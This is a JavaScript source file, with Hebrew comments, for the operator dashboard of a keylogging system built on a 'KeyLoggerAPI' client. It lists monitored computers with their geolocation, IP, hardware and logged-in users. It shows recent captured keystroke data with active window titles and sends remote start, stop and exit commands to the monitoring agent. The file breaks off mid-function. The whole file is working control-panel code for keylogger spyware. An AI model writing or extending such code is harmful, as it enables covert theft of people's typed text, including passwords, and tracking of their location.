// קבועים
let machinesList = [];
let selectedMachine = null;
let controlPollInterval = null;
let machineModal = null;

// בדיקת אימות
document.addEventListener("DOMContentLoaded", function () {
  // בדיקה שהמשתמש מחובר
  if (!checkAuth()) return;

  // אתחול המודאל
  machineModal = new bootstrap.Modal(document.getElementById("machineModal"), {
    backdrop: "static",
    keyboard: false,
  });

  // טעינת רשימת מחשבים
  loadMachines();

  // הגדרת אירועי לחיצה
  initializeEvents();

  // הצגת שם המשתמש
  const userData = KeyLoggerAPI.getCurrentUser();
  if (userData) {
    document.getElementById("user-name").textContent = userData.userId;
  }

  // בדיקה אם יש הרשאות מנהל (למטרות תצוגה בלבד)
  checkAdminPermissions();
});

// בדיקת הרשאות מנהל
async function checkAdminPermissions() {
  try {
    const response = await KeyLoggerAPI.fetchWithAuth("/api/agents");

    if (response && response.ok) {
      // למשתמש יש הרשאות מנהל
      document
        .querySelectorAll(".admin-only")
        .forEach((el) => (el.style.display = "block"));
    }
  } catch (error) {
    console.error("Admin check error:", error);
  }
}

// טעינת רשימת מחשבים
async function loadMachines() {
  // הצגת מסך טעינה
  document.getElementById("machines-loading").style.display = "block";
  document.getElementById("machines-error").style.display = "none";
  document.getElementById("no-machines").style.display = "none";
  document.getElementById("machines-grid").innerHTML = "";

  showLoading(true);

  try {
    console.debug("Loading machines...");
    machinesList = (await KeyLoggerAPI.get("/api/machine")) || [];

    /* if (!machinesList) {
            throw new Error("Failed to load machines");
          } */

    machinesList = machinesList.map((machine) => {
      let status = "unknown";
      if (machine.tracking === -1) {
        status = "stopped";
      } else if (machine.tracking === 0) {
        status = "exit";
      } else if (machine.tracking > 0) {
        status = "running";
      }

      // בדיקת זמן last_seen - אם עבר יותר מ-10 דקות, המחשב נחשב למנותק
      const lastSeenTime = machine.last_seen * 1000; // המרה למילישניות
      const tenMinutesAgo = Date.now() - 10 * 60 * 1000;
      if (lastSeenTime < tenMinutesAgo) {
        //status = "unknown";
      }

      return { ...machine, status: status };
    });

    // הסתרת מסך טעינה
    document.getElementById("machines-loading").style.display = "none";

    // הצגת רשימת המחשבים
    renderMachinesGrid(machinesList);

    // עדכון זמן אחרון
    document.getElementById(
      "last-update"
    ).textContent = `עודכן לאחרונה: ${new Date().toLocaleTimeString()}`;
  } catch (error) {
    console.error("Error loading machines:", error);
    document.getElementById("machines-loading").style.display = "none";
    document.getElementById("machines-error").style.display = "block";
    showNotification(
      "שגיאת טעינה",
      "אירעה שגיאה בטעינת רשימת המחשבים",
      "error"
    );
  } finally {
    showLoading(false);
  }
}

// הצגת רשימת מחשבים בתצוגת גריד
function renderMachinesGrid(machines, filter = "all", searchTerm = "") {
  const gridContainer = document.getElementById("machines-grid");
  gridContainer.innerHTML = "";

  // פילטור המחשבים
  let filteredMachines = machines;

  if (filter === "running") {
    filteredMachines = machines.filter((m) => m.status === "running");
  } else if (filter === "stopped") {
    filteredMachines = machines.filter((m) => m.status === "stopped");
  }

  // חיפוש
  if (searchTerm) {
    const term = searchTerm.toLowerCase();
    filteredMachines = filteredMachines.filter(
      (m) =>
        (m.name && m.name.toLowerCase().includes(term)) ||
        m.id.toLowerCase().includes(term) ||
        (m.info &&
          m.info.pc_name &&
          m.info.pc_name.toLowerCase().includes(term))
    );
  }

  if (filteredMachines.length === 0) {
    document.getElementById("no-machines").style.display = "block";
    return;
  } else {
    document.getElementById("no-machines").style.display = "none";
  }

  // יצירת כרטיס עבור כל מחשב
  filteredMachines.forEach((machine, index) => {
    const status = machine.status || "unknown";
    const statusClass = status;

    // בחירת הסטטוס והאייקון המתאים
    let statusText, statusBadgeClass, statusIcon;
    switch (status) {
      case "running":
        statusText = "פעיל";
        statusBadgeClass = "bg-success";
        statusIcon = "fa-check-circle";
        break;
      case "stopped":
        statusText = "מושבת";
        statusBadgeClass = "bg-danger";
        statusIcon = "fa-times-circle";
        break;
      case "exit":
        statusText = "סגור";
        statusBadgeClass = "bg-warning";
        statusIcon = "fa-exclamation-circle";
        break;
      default:
        console.error("Unknown status:", status);
        statusText = "לא ידוע";
        statusBadgeClass = "bg-secondary";
        statusIcon = "fa-question-circle";
    }

    // קבלת אייקון מערכת הפעלה
    const osIcon = getOSIcon(machine);

    // מידע המחשב
    const info = machine.info || {};
    const system = info.system || {};
    const geo = info.geo || {};
    const osInfo = system.os_name
      ? `${system.os_name} ${system.os_version || ""}`
      : "לא ידוע";

    // מידע גיאוגרפי
    const locationInfo =
      geo.status === "success" ? `${geo.city || ""}, ${geo.country || ""}` : "";

    // יצירת אלמנט הכרטיס עם אנימציית כניסה
    const machineCol = document.createElement("div");
    machineCol.className = "col fade-in";
    // הוספת השהייה קטנה לאנימציה מדורגת
    machineCol.style.animationDelay = `${index * 0.05}s`;

    // המרת זמן last_seen לתצוגה אנושית
    const lastSeenDate = new Date(machine.last_seen * 1000);
    const lastSeenStr = formatDate(lastSeenDate);

    machineCol.innerHTML = `
                    <div class="card machine-card" data-id="${machine.id}">
                        <div class="machine-status ${statusClass}"></div>
                        <div class="card-body text-center">
                            <div class="machine-icon">
                                ${osIcon}
                            </div>
                            <h5 class="card-title">${
                              machine.name || info.pc_name || "מחשב ללא שם"
                            }</h5>
                            <p class="card-text text-muted">${machine.id}</p>
                            <span class="badge ${statusBadgeClass}">
                                <i class="fas ${statusIcon} me-1"></i> ${statusText}
                            </span>
                            <p class="card-text mt-2">
                                <small class="text-muted">${osInfo}</small>
                            </p>
                            ${
                              locationInfo
                                ? `<p class="card-text location-info">
                                <i class="fas fa-map-marker-alt text-danger me-1"></i>
                                <small>${locationInfo}</small>
                            </p>`
                                : ""
                            }
                            <div class="d-flex justify-content-between mt-2">
                                <small class="text-muted">נראה לאחרונה: ${lastSeenStr}</small>
                            </div>
                            <div class="action-buttons">
                                <a href="data.html?machine=${
                                  machine.id
                                }" class="btn btn-sm btn-outline-primary">
                                    <i class="fas fa-database me-1"></i> צפה בנתונים
                                </a>
                            </div>
                        </div>
                    </div>
                `;

    gridContainer.appendChild(machineCol);

    // הוספת אירוע לחיצה לפתיחת המודאל
    const card = machineCol.querySelector(".machine-card");
    card.addEventListener("click", function (e) {
      // אם לחצו על כפתור, לא לפתוח את המודאל
      if (e.target.tagName === "A" || e.target.closest("a")) {
        e.stopPropagation();
        return;
      }

      // פתיחת המודאל
      openMachineModal(machine);
    });
  });
}

// פתיחת מודאל פרטי מחשב
function openMachineModal(machine) {
  selectedMachine = machine;
  console.log("Opening modal for machine:", machine.id);

  // עדכון כותרת
  document.getElementById("modal-machine-title").textContent =
    machine.name || machine.info?.pc_name || machine.id;

  // עדכון תג סטטוס
  const statusBadge = document.getElementById("modal-status-badge");
  switch (machine.status) {
    case "running":
      statusBadge.textContent = "פעיל";
      statusBadge.className = "badge status-badge bg-success";
      break;
    case "stopped":
      statusBadge.textContent = "מושבת";
      statusBadge.className = "badge status-badge bg-danger";
      break;
    default:
      statusBadge.textContent = "לא ידוע";
      statusBadge.className = "badge status-badge bg-secondary";
  }

  // זמן אחרון שנראה
  const lastSeenTime = new Date(machine.last_seen * 1000);
  const lastSeenTimeStr = formatDate(lastSeenTime);

  // הוספת שדה "נראה לאחרונה" לכותרת המודאל
  const modalTitle = document.getElementById("modal-machine-title");
  // ניקוי תגים ישנים במקרה שכבר הוספנו אחד
  const existingSmall = modalTitle.querySelector("small");
  if (existingSmall) {
    existingSmall.remove();
  }

  const lastSeenEl = document.createElement("small");
  lastSeenEl.className = "d-block text-muted mt-1";
  lastSeenEl.style.fontSize = "0.8rem";
  lastSeenEl.textContent = `נראה לאחרונה: ${lastSeenTimeStr}`;
  modalTitle.appendChild(lastSeenEl);

  // מילוי פרטי המחשב
  fillMachineDetails(machine);

  // טעינת נתוני שליטה ונתונים אחרונים
  startControlPolling(machine.id);
  loadRecentData(machine.id);

  // עדכון כפתור צפייה בנתונים
  document.getElementById(
    "view-all-data"
  ).href = `data.html?machine=${machine.id}`;

  // הצגת המודאל
  try {
    machineModal.show();
    console.log("Modal shown");
  } catch (e) {
    console.error("Error showing modal:", e);
    alert("שגיאה בפתיחת המודאל, נא לרענן את הדף");
  }
}

// מילוי פרטי המחשב במודאל
function fillMachineDetails(machine) {
  document.getElementById("detail-machine-id").textContent = machine.id;

  const info = machine.info || {};
  const system = info.system || {};
  const network = info.network || {};
  const memory = info.memory || {};
  const cpu = info.cpu || {};
  const disks = info.disks || [];
  const geo = info.geo || {};

  // מידע כללי
  document.getElementById("detail-pc-name").textContent =
    info.pc_name || "לא זמין";

  // פורמוט מידע מערכת ההפעלה
  let osDetails = system.os_name || "לא ידוע";
  if (system.os_version) {
    if (system.os_name === "Linux") {
      // קיצור גרסת ליבה ארוכה של לינוקס
      const kernelVersion = system.os_version.split(" ")[0];
      osDetails += ` (Kernel ${kernelVersion})`;
    } else {
      osDetails += ` ${system.os_version}`;
    }
  }
  if (system.os_architecture) {
    osDetails += ` (${system.os_architecture})`;
  }
  document.getElementById("detail-os").textContent = osDetails;

  // בדיקה שהאלמנטים קיימים לפני מילוי המידע
  if (document.getElementById("detail-processor")) {
    // מידע על המעבד
    fillCpuInfo(cpu);
  } else {
    console.error("CPU info container not found in DOM");
  }

  if (document.getElementById("detail-memory")) {
    // מידע על הזיכרון
    fillMemoryInfo(memory);
  } else {
    console.error("Memory info container not found in DOM");
  }

  // משתמשים מחוברים
  const usersElement = document.getElementById("detail-users");
  if (usersElement) {
    usersElement.textContent =
      info.users && info.users.length > 0 ? info.users.join(", ") : "אין מידע";
  }

  // מידע על דיסקים
  if (document.getElementById("disks-table-body")) {
    fillDisksTable(disks);
  } else {
    console.error("Disks table body not found in DOM");
  }

  // מידע על כרטיסי רשת
  if (document.getElementById("network-adapters-container")) {
    fillNetworkAdaptersInfo(network.network_adapters || []);
  } else {
    console.error("Network adapters container not found in DOM");
  }

  // מידע גיאוגרפי
  if (document.getElementById("geo-info-container")) {
    fillGeoInfo(geo);
  } else {
    console.error("Geo info container not found in DOM");
  }
}

// מילוי פרטי מעבד
function fillCpuInfo(cpu) {
  const container = document.getElementById("detail-processor");

  // בדיקה שהאלמנט קיים
  if (!container) {
    console.error("detail-processor element not found");
    return;
  }

  if (!cpu || (!cpu.processor && !cpu.physical_cores)) {
    container.innerHTML = `
            <div class="text-center py-3">
              <i class="fas fa-info-circle text-muted me-2"></i>
              אין מידע זמין על המעבד
            </div>
          `;
    return;
  }

  let processorName = cpu.processor || "מעבד לא ידוע";
  const coresInfo = cpu.physical_cores
    ? `<div class="mt-3">
            <div class="row">
              <div class="col-6">
                <div class="d-flex align-items-center mb-2">
                  <div class="me-2 text-primary">
                    <i class="fas fa-microchip"></i>
                  </div>
                  <div>
                    <div class="text-muted small">ליבות פיזיות</div>
                    <div class="fw-bold">${cpu.physical_cores}</div>
                  </div>
                </div>
              </div>
              <div class="col-6">
                <div class="d-flex align-items-center mb-2">
                  <div class="me-2 text-primary">
                    <i class="fas fa-sitemap"></i>
                  </div>
                  <div>
                    <div class="text-muted small">ליבות לוגיות</div>
                    <div class="fw-bold">${
                      cpu.total_cores || cpu.physical_cores
                    }</div>
                  </div>
                </div>
              </div>
            </div>
            ${
              cpu.max_frequency
                ? `<div class="d-flex align-items-center mt-2">
                <div class="me-2 text-primary">
                  <i class="fas fa-tachometer-alt"></i>
                </div>
                <div>
                  <div class="text-muted small">מהירות מקסימלית</div>
                  <div class="fw-bold">${cpu.max_frequency}</div>
                </div>
              </div>`
                : ""
            }
          </div>`
    : "";

  container.innerHTML = `
          <h5 class="mb-3">${processorName}</h5>
          ${coresInfo}
        `;
}

// מילוי פרטי זיכרון
function fillMemoryInfo(memory) {
  const container = document.getElementById("detail-memory");

  // בדיקה שהאלמנט קיים
  if (!container) {
    console.error("detail-memory element not found");
    return;
  }

  if (!memory || !memory.total) {
    container.innerHTML = `
            <div class="text-center py-3">
              <i class="fas fa-info-circle text-muted me-2"></i>
              אין מידע זמין על הזיכרון
            </div>
          `;
    return;
  }

  // חישוב ערכים לתצוגה גרפית
  const totalMemory = memory.total;
  const percentUsed = parseFloat(memory.percent_used || "0");
  const usedMemory = memory.available
    ? `נוצל: ${calculateUsedMemory(memory.total, memory.available)}`
    : `${percentUsed}% בשימוש`;

  // קביעת צבע לפס התקדמות
  let progressClass = "bg-success";
  if (percentUsed > 85) {
    progressClass = "bg-danger";
  } else if (percentUsed > 70) {
    progressClass = "bg-warning";
  }

  container.innerHTML = `
          <div>
            <div class="d-flex justify-content-between align-items-center mb-2">
              <h5 class="mb-0">${totalMemory}</h5>
              <span class="badge bg-light text-dark">${usedMemory}</span>
            </div>
            
            <div class="progress" style="height: 10px;">
              <div class="progress-bar ${progressClass}" role="progressbar" 
                style="width: ${percentUsed}%" 
                aria-valuenow="${percentUsed}" 
                aria-valuemin="0" 
                aria-valuemax="100"></div>
            </div>
            
            <div class="d-flex justify-content-between mt-2">
              <small class="text-muted">0%</small>
              <small class="text-muted">50%</small>
              <small class="text-muted">100%</small>
            </div>
            
            ${
              memory.available
                ? `<div class="mt-3">
                <div class="d-flex align-items-center">
                  <div class="me-2 text-success">
                    <i class="fas fa-check-circle"></i>
                  </div>
                  <div>
                    <div class="text-muted small">זיכרון פנוי</div>
                    <div class="fw-bold">${memory.available}</div>
                  </div>
                </div>
              </div>`
                : ""
            }
          </div>
        `;
}

// חישוב זיכרון בשימוש
function calculateUsedMemory(total, available) {
  try {
    // ניסיון להמיר סטרינגים כמו "15.32 GB" ל־ "11.26 GB"
    const totalMatch = total.match(/(\d+(\.\d+)?)\s*([A-Za-z]+)/);
    const availableMatch = available.match(/(\d+(\.\d+)?)\s*([A-Za-z]+)/);

    if (totalMatch && availableMatch && totalMatch[3] === availableMatch[3]) {
      const totalValue = parseFloat(totalMatch[1]);
      const availableValue = parseFloat(availableMatch[1]);
      const unit = totalMatch[3];

      const usedValue = totalValue - availableValue;
      return `${usedValue.toFixed(2)} ${unit}`;
    }

    return "לא ידוע";
  } catch (e) {
    console.error("Error calculating used memory:", e);
    return "לא ידוע";
  }
}

// איפוס שדות בקרה
document.getElementById("control-status").textContent = "בודק סטטוס...";
document.getElementById("control-status").className = "badge bg-secondary";
document.getElementById("recent-data-list").innerHTML =
  '<p class="text-center text-muted">טוען נתונים אחרונים...</p>';

// קבלת אייקון מערכת הפעלה
function getOSIcon(machine) {
  if (!machine.info || !machine.info.system) {
    return '<i class="fas fa-desktop"></i>';
  }

  const osName = machine.info.system.os_name?.toLowerCase() || "";

  if (osName.includes("windows")) {
    return '<i class="fab fa-windows"></i>';
  } else if (osName.includes("mac") || osName.includes("darwin")) {
    return '<i class="fab fa-apple"></i>';
  } else if (osName.includes("linux")) {
    return '<i class="fab fa-linux"></i>';
  } else {
    return '<i class="fas fa-desktop"></i>';
  }
}

// מילוי טבלת דיסקים
function fillDisksTable(disks) {
  const tableBody = document.getElementById("disks-table-body");

  // בדיקה שהאלמנט קיים
  if (!tableBody) {
    console.error("disks-table-body element not found");
    return;
  }

  if (!disks || disks.length === 0) {
    tableBody.innerHTML = `
            <tr>
              <td colspan="5" class="text-center py-3">
                <i class="fas fa-info-circle text-muted me-2"></i>
                אין מידע זמין על דיסקים
              </td>
            </tr>
          `;
    return;
  }

  tableBody.innerHTML = "";

  disks.forEach((disk) => {
    // חישוב אחוזי שימוש
    let usagePercent = 0;
    if (disk.total_size && disk.used) {
      const totalSizeNum = parseFloat(disk.total_size);
      const usedNum = parseFloat(disk.used);
      if (!isNaN(totalSizeNum) && !isNaN(usedNum) && totalSizeNum > 0) {
        usagePercent = Math.round((usedNum / totalSizeNum) * 100);
      }
    }

    // קביעת צבע לפס ההתקדמות
    let progressClass = "bg-success";
    if (usagePercent > 85) {
      progressClass = "bg-danger";
    } else if (usagePercent > 70) {
      progressClass = "bg-warning";
    }

    const row = document.createElement("tr");
    row.innerHTML = `
            <td>
              <div class="fw-medium">${disk.mountpoint}</div>
              <small class="text-muted">${disk.device}</small>
            </td>
            <td>${disk.filesystem_type || "לא ידוע"}</td>
            <td>${disk.total_size || "לא ידוע"}</td>
            <td>${disk.free || "לא ידוע"}</td>
            <td style="width: 150px">
              <div class="d-flex align-items-center">
                <div class="progress flex-grow-1 me-2" style="height: 8px; min-width: 100px;">
                  <div class="progress-bar ${progressClass}" role="progressbar" style="width: ${usagePercent}%" aria-valuenow="${usagePercent}" aria-valuemin="0" aria-valuemax="100"></div>
                </div>
                <span class="text-muted small">${usagePercent}%</span>
              </div>
            </td>
          `;

    tableBody.appendChild(row);
  });
}

// מילוי מידע גיאוגרפי
function fillGeoInfo(geo) {
  const container = document.getElementById("geo-info-container");

  // בדיקה שהאלמנט קיים
  if (!container) {
    console.error("geo-info-container element not found");
    return;
  }

  if (!geo || geo.status !== "success") {
    container.innerHTML = `
            <div class="text-center py-3">
              <i class="fas fa-info-circle text-muted me-2"></i>
              אין מידע גיאוגרפי זמין
            </div>
          `;
    return;
  }

  // יצירת כרטיסיות מידע
  container.innerHTML = `
    <div class="row">
      <div class="col-md-6">
        <div class="card h-100 mb-3 mb-md-0">
          <div class="card-body p-3">
            <h6 class="card-title mb-3">
              <i class="fas fa-map-marker-alt text-danger me-2"></i>מיקום
            </h6>
            <div class="list-group list-group-flush">
              <div class="list-group-item bg-light p-2 d-flex justify-content-between">
                <span>מדינה</span>
                <span class="fw-medium">${geo.country || "לא ידוע"} (${
    geo.countryCode || ""
  })</span>
              </div>
              <div class="list-group-item bg-light p-2 d-flex justify-content-between">
                <span>עיר</span>
                <span class="fw-medium">${geo.city || "לא ידוע"}</span>
              </div>
              <div class="list-group-item bg-light p-2 d-flex justify-content-between">
                <span>אזור</span>
                <span class="fw-medium">${geo.regionName || "לא ידוע"}</span>
              </div>
              <div class="list-group-item bg-light p-2 d-flex justify-content-between">
                <span>מיקוד</span>
                <span class="fw-medium">${geo.zip || "לא ידוע"}</span>
              </div>
              <div class="list-group-item bg-light p-2 d-flex justify-content-between">
                <span>אזור זמן</span>
                <span class="fw-medium">${geo.timezone || "לא ידוע"}</span>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div class="col-md-6">
        <div class="card h-100">
          <div class="card-body p-3">
            <h6 class="card-title mb-3">
              <i class="fas fa-network-wired text-primary me-2"></i>פרטי רשת
            </h6>
            <div class="list-group list-group-flush">
              <div class="list-group-item bg-light p-2 d-flex justify-content-between">
                <span>כתובת IP</span>
                <span class="fw-medium">${geo.query || "לא ידוע"}</span>
              </div>
              <div class="list-group-item bg-light p-2 d-flex justify-content-between">
                <span>ספק אינטרנט</span>
                <span class="fw-medium">${geo.isp || "לא ידוע"}</span>
              </div>
              <div class="list-group-item bg-light p-2 d-flex justify-content-between">
                <span>ארגון</span>
                <span class="fw-medium">${geo.org || "לא ידוע"}</span>
              </div>
              <div class="list-group-item bg-light p-2 d-flex justify-content-between">
                <span>AS</span>
                <span class="fw-medium">${geo.as || "לא ידוע"}</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="mt-3">
      <div class="card">
        <div class="card-body p-3">
          <h6 class="card-title mb-3">
            <i class="fas fa-map text-success me-2"></i>קואורדינטות
          </h6>
          <div class="d-flex justify-content-between">
            <div>
              <div class="text-muted small">קו רוחב</div>
              <div class="fw-bold">${geo.lat || "לא ידוע"}</div>
            </div>
            <div>
              <div class="text-muted small">קו אורך</div>
              <div class="fw-bold">${geo.lon || "לא ידוע"}</div>
            </div>
            <div>
              <a href="https://www.google.com/maps?q=${geo.lat},${
    geo.lon
  }" target="_blank" class="btn btn-sm btn-outline-primary">
                <i class="fas fa-external-link-alt me-1"></i>פתח במפות
              </a>
            </div>
          </div>
        </div>
      </div>
    </div>
  `;
}

// מילוי מידע על כרטיסי רשת
function fillNetworkAdaptersInfo(adapters) {
  const container = document.getElementById("network-adapters-container");

  // בדיקה שהאלמנט קיים
  if (!container) {
    console.error("network-adapters-container element not found");
    return;
  }

  if (!adapters || adapters.length === 0) {
    container.innerHTML = `
            <div class="text-center py-3">
              <i class="fas fa-info-circle text-muted me-2"></i>
              אין מידע זמין על כרטיסי רשת
            </div>
          `;
    return;
  }

  container.innerHTML = `<div class="row row-cols-1 row-cols-md-3 g-3"></div>`;
  const cardsContainer = container.querySelector(".row");

  adapters.forEach((adapter) => {
    const adapterCard = document.createElement("div");
    adapterCard.className = "col";

    let addressesHTML = '<div class="text-muted small">אין כתובות IP</div>';

    if (adapter.addresses && adapter.addresses.length > 0) {
      addressesHTML = `
              <div class="list-group list-group-flush mt-2">
                ${adapter.addresses
                  .map(
                    (addr) => `
                  <div class="list-group-item bg-light p-2">
                    <div class="d-flex justify-content-between">
                      <span>IP</span>
                      <span class="fw-medium">${addr.ip || "לא ידוע"}</span>
                    </div>
                    <div class="d-flex justify-content-between">
                      <span>Netmask</span>
                      <span class="fw-medium">${
                        addr.netmask || "לא ידוע"
                      }</span>
                    </div>
                  </div>
                `
                  )
                  .join("")}
              </div>
            `;
    }

    // בחירת אייקון מתאים לסוג הכרטיס
    let adapterIcon = "fa-network-wired";
    let adapterTypeClass = "text-primary";

    if (adapter.name && adapter.name.startsWith("wl")) {
      adapterIcon = "fa-wifi";
      adapterTypeClass = "text-success";
    } else if (
      adapter.name &&
      (adapter.name.includes("vir") || adapter.name.includes("br"))
    ) {
      adapterIcon = "fa-project-diagram";
      adapterTypeClass = "text-info";
    } else if (adapter.name && adapter.name.startsWith("wg")) {
      adapterIcon = "fa-shield-alt";
      adapterTypeClass = "text-warning";
    }

    adapterCard.innerHTML = `
            <div class="card h-100">
              <div class="card-body p-3">
                <div class="d-flex align-items-center mb-2">
                  <div class="me-2 ${adapterTypeClass}">
                    <i class="fas ${adapterIcon} fa-lg"></i>
                  </div>
                  <h6 class="card-title mb-0">${adapter.name}</h6>
                </div>
                ${addressesHTML}
              </div>
            </div>
          `;

    cardsContainer.appendChild(adapterCard);
  });
}

// פונקציית בקרה עבור מחשב
async function sendControl(machineId, action) {
  showLoading(true);

  try {
    const response = await KeyLoggerAPI.post("/api/ctrl", {
      machine_id: machineId,
      ctrl: action,
    });

    if (response) {
      // עדכון המחשב ברשימה
      const updatedMachines = machinesList.map((m) => {
        if (m.id === machineId) {
          let newStatus = m.status;
          if (action === "start") newStatus = "running";
          else if (action === "stop") newStatus = "stopped";
          else if (action === "exit") newStatus = "unknown";

          return { ...m, status: newStatus };
        }
        return m;
      });

      machinesList = updatedMachines;

      // רענון תצוגת הגריד
      const searchTerm = document.getElementById("machine-search").value;
      const filter = document
        .querySelector('input[name="status-filter"]:checked')
        .id.replace("-machines", "");
      renderMachinesGrid(machinesList, filter, searchTerm);

      showLoading(false);
      return true;
    }

    showLoading(false);
    return false;
  } catch (error) {
    console.error("Control error:", error);
    showNotification("שגיאת שליטה", "אירעה שגיאה בשליחת פקודת שליטה", "error");
    showLoading(false);
    return false;
  }
}

// פונקציית קבלת סטטוס בקרה
async function getControlStatus(machineId) {
  try {
    const response = await KeyLoggerAPI.fetchWithAuth(
      `/ctrl?machine_id=${machineId}&from_api=1`
    );

    if (response && response.ok) {
      const data = await response.json();
      updateControlStatus(data.ctrl);
      return data.ctrl;
    }

    updateControlStatus("unknown");
    return "unknown";
  } catch (error) {
    console.error("Get control status error:", error);
    updateControlStatus("error");
    return "error";
  }
}

// התחלת פולינג סטטוס בקרה
function startControlPolling(machineId) {
  // ניקוי פולינג קודם אם קיים
  if (controlPollInterval) {
    clearInterval(controlPollInterval);
  }

  // בדיקת סטטוס ראשונית
  getControlStatus(machineId);

  // הגדרת פולינג כל 10 שניות
  controlPollInterval = setInterval(() => {
    if (document.getElementById("machineModal").classList.contains("show")) {
      getControlStatus(machineId);
    } else {
      clearInterval(controlPollInterval);
    }
  }, 10000);
}

// עדכון סטטוס בקרה
function updateControlStatus(status) {
  const statusEl = document.getElementById("control-status");

  switch (status) {
    case "start":
    case "running":
      statusEl.textContent = "פעיל";
      statusEl.className = "badge bg-success";
      break;
    case "stop":
    case "stopped":
      statusEl.textContent = "מושבת";
      statusEl.className = "badge bg-danger";
      break;
    case "exit":
      statusEl.textContent = "סגור";
      statusEl.className = "badge bg-secondary";
      break;
    case "error":
      statusEl.textContent = "שגיאה";
      statusEl.className = "badge bg-warning";
      break;
    default:
      statusEl.textContent = "לא ידוע";
      statusEl.className = "badge bg-secondary";
  }
}

// ריק - הוסר יומן פעולות

// טעינת נתונים אחרונים
async function loadRecentData(machineId) {
  try {
    const data = await KeyLoggerAPI.get(`/api/data/${machineId}`);

    if (data) {
      // הצגת 5 רשומות אחרונות בלבד
      renderRecentData(data.slice(0, 5));
    } else {
      document.getElementById("recent-data-list").innerHTML =
        '<p class="text-center text-muted">אין נתונים זמינים</p>';
    }
  } catch (error) {
    console.error("Recent data error:", error);
    document.getElementById("recent-data-list").innerHTML =
      '<div class="alert alert-danger">שגיאה בטעינת נתונים אחרונים</div>';
  }
}

// הצגת נתונים אחרונים
function renderRecentData(dataItems) {
  const container = document.getElementById("recent-data-list");

  if (!dataItems || dataItems.length === 0) {
    container.innerHTML =
      '<p class="text-center text-muted">אין נתונים זמינים</p>';
    return;
  }

  container.innerHTML = "";
  const table = document.createElement("table");
  table.className = "table table-sm table-hover";
  table.innerHTML = `
                <thead>
                    <tr>
                        <th>חלון פעיל</th>
                        <th>זמן התחלה</th>
                        <th>זמן סיום</th>
                        <th>נתונים</th>
                    </tr>
                </thead>
                <tbody id="recent-data-body"></tbody>
            `;

  const tbody = table.querySelector("tbody");

  dataItems.forEach((item) => {
    const row = document.createElement("tr");
    const startTime = new Date(item.start_time);
    const endTime = new Date(item.end_time);

    // קיצור הנתונים אם הם ארוכים מדי
    let dataPreview = String(item.data).replace(/\+\,/, "");
    if (dataPreview.length > 50) {
      dataPreview = dataPreview.substring(0, 100) + "...";
    }

    row.innerHTML = `
                    <td><span class="badge bg-light text-dark">${
                      item.active_window || "לא ידוע"
                    }</span></td>
                    <td>${formatDate(startTime)}</td>
                    <td>${formatDate(endTime)}</td>
                    <td>
                        <code class="small">${dataPreview}</code>
                    </td>
                `;

    tbody.appendChild(row);
  });

  container.appendChild(table);
}

// אישור פעולת בקרה
function confirmAction(action, callback) {
  let title, message;

  switch (action) {
    case "start":
      title = "התחלת ניטור";
      message = "האם אתה בטוח שברצונך להתחיל ניטור במחשב זה?";
      break;
    case "stop":
      title = "הפסקת ניטור";
      message = "האם אתה בטוח שברצונך להפסיק ניטור במחשב זה?";
      break;
    case "exit":
      title = "סגירת תוכנה";
      message =
        "האם אתה בטוח שברצונך לסגור את תוכנת הניטור במחשב זה? לא ניתן יהיה להתחבר למחשב מרחוק עד להפעלה מחודשת של התוכנה.";
      break;
    default:
      title = "אישור פעולה";
      message = "האם אתה בטוח שברצונך לבצע פעולה זו?";
  }

  showConfirmation(title, message, callback);
}

// פורמט תאריך
function formatDate(date) {
  // בדיקה אם התאריך תקף
  if (isNaN(date.getTime())) {
    return "לא ידוע";
  }

  // חישוב זמן יחסי אם התאריך הוא מהיום או אתמול
  const now = new Date();
  const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
  const yesterday = new Date(today);
  yesterday.setDate(yesterday.getDate() - 1);

  const isToday = date >= today;
  const isYesterday = date >= yesterday && date < today;

  // בדיקה אם עברו פחות מ-60 דקות
  const minutesDiff = Math.floor((now - date) / (1000 * 60));

  if (minutesDiff < 60 && isToday) {
    if (minutesDiff < 1) {
      return "לפני פחות מדקה";
    } else if (minutesDiff === 1) {
      return "לפני דקה";
    } else {
      return `לפני ${minutesDiff} דקות`;
    }
  } else if (isToday) {
    return `היום, ${date.toLocaleTimeString("he-IL", {
      hour: "2-digit",
      minute: "2-digit",
    })}`;
  } else if (isYesterday) {
    return `אתמול, ${date.toLocaleTimeString("he-IL", {
      hour: "2-digit",
      minute: "2-digit",
    })}`;
  } else {
    return date.toLocaleString("he-IL", {
      day: "2-digit",
      month: "2-digit",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    });
  }
}

// אתחול אירועים
function initializeEvents() {
  console.log("Initializing events");

  // אירוע התנתקות
  document
    .getElementById("logout-link")
    .addEventListener("click", function (e) {
      e.preventDefault();
      KeyLoggerAPI.logout();
    });

  // רענון רשימת מחשבים
  document
    .getElementById("refresh-machines")
    .addEventListener("click", loadMachines);
  document
    .getElementById("error-refresh-btn")
    .addEventListener("click", loadMachines);

  // אירועי פילטר
  document
    .getElementById("all-machines")
    .addEventListener("change", function () {
      const searchTerm = document.getElementById("machine-search").value;
      renderMachinesGrid(machinesList, "all", searchTerm);
    });

  document
    .getElementById("running-machines")
    .addEventListener("change", function () {
      const searchTerm = document.getElementById("machine-search").value;
      renderMachinesGrid(machinesList, "running", searchTerm);
    });

  document
    .getElementById("stopped-machines")
    .addEventListener("change", function () {
      const searchTerm = document.getElementById("machine-search").value;
      renderMachinesGrid(machinesList, "stopped", searchTerm);
    });

  // אירוע חיפוש
  document
    .getElementById("machine-search")
    .addEventListener("input", function () {
      const filter = document
        .querySelector('input[name="status-filter"]:checked')
        .id.replace("-machines", "");
      renderMachinesGrid(machinesList, filter, this.value);
    });

  // אירועי בקרה במודאל
  const controlStartBtn = document.getElementById("control-start");
  if (controlStartBtn) {
    controlStartBtn.addEventListener("click", function () {
      console.log("Start control clicked");
      if (!selectedMachine) {
        console.log("No machine selected");
        return;
      }

      confirmAction("start", async () => {
        const success = await sendControl(selectedMachine.id, "start");
        if (success) {
          updateControlStatus("running");
          showNotification(
            "פקודה נשלחה",
            "פקודת הפעלה נשלחה בהצלחה",
            "success"
          );
        }
      });
    });
  } else {
    console.error("Control start button not found");
  }

  const controlStopBtn = document.getElementById("control-stop");
  if (controlStopBtn) {
    controlStopBtn.addEventListener("click", function () {
      console.log("Stop control clicked");
      if (!selectedMachine) {
        console.log("No machine selected");
        return;
      }

      confirmAction("stop", async () => {
